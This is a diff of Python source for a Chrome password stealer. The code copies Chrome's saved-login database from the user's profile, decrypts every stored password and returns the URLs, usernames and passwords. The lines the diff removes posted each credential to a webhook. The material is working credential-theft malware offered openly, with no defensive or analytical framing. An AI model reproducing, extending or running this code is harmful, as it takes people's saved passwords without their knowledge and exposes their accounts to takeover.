@@ -1,22 +1,22 @@
 import os
-import json
 import sqlite3
 import shutil
-import requests
 
-from password_decrypter import ChromePWDecrypter
+from .password_decrypter import ChromePWDecrypter
 
 
-class Chrome_PE:
-    def __init__(self, webhook_url=""):
-        # Communication
-        self.webhook_url = webhook_url
+class Chrome_PWStealer:
+    def __init__(self,temp_path=""):
         # Db
+        self.temp_path = temp_path
+        self.filename_db = os.path.join(self.temp_path + "chrome_temp.db")
+        self.decrypter = ChromePWDecrypter(self.filename_db) 
         self.db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
-        self.rows = self.extract_db_rows()   
-        # Encryption
-        self.decrypter = ChromePWDecrypter(self.db_path)         
+        self.rows = self.extract_and_decrypt_db_rows()
+        os.remove(self.filename_db)
+
+       
     # ENCRYPTION RELATED
     def decrypt_password(self, password):
         if not password:
@@ -36,27 +36,20 @@ class Chrome_PE:
             # print(f"Decryption error: {str(e)}")
             return str(e)
     # DB RELATED
-    def extract_db_rows(self):
-        db = sqlite3.connect(self.db_path)
+    def copy_db_to_filename(self):
+        shutil.copyfile(self.db_path, self.filename_db)
+    def extract_and_decrypt_db_rows(self):
+        self.copy_db_to_filename()
+        db = sqlite3.connect(self.filename_db)
         cursor = db.cursor()
         # 'logins' table has the data
         cursor.execute(
             "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
             "order by date_last_used")
-        
         # iterate over all rows
-        return [[x[0],x[2],x[3]] for x in cursor.fetchall()]
-    # APP RELATED
-    def send_webhook(self,data):
-        data = {"content" :  data}
-        requests.post(self.webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
-    def execute(self):
-        self.rows = [[x[0],x[1],self.decrypt_password(x[2])] for x in self.rows]
-        for row in self.rows:
-            self.send_webhook(f" {'-'*10} \n**URL** : {row[0]} \n**USERNAME** : {row[1]} \n**PASSWORD** : {row[2]} \n {'-'*10} ")
+        return [[x[0],x[2],self.decrypt_password(x[3])] for x in cursor.fetchall()]
+    def get_passwords(self):
+        return self.rows
     
 if __name__ == "__main__":
-    PE = Chrome_PE(
-        webhook_url="your-webook-url",
-    )
-    PE.execute()   
+    print("ok") 
